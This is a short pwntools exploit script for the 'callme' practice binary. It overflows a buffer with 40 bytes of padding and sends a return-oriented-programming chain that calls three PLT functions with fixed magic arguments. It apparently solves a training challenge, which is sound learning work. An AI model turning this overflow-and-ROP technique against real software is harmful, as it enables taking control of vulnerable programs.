from pwn import *

context.arch = "amd64"
elf = ELF("callme")
rop = ROP(elf)

offset = 40
arg_one = 0xdeadbeefdeadbeef
arg_two = 0xcafebabecafebabe
arg_three = 0xd00df00dd00df00d
args = [arg_one, arg_two, arg_three]

# Create ROP-chain by calling functions from plt
rop.call(elf.plt.callme_one, args)
rop.call(elf.plt.callme_two, args)
rop.call(elf.plt.callme_three, args)
payload = b'A'*offset + rop.chain()

p = elf.process()
p.recvuntil(b">")
p.sendline(payload)
print(p.recvall().decode())
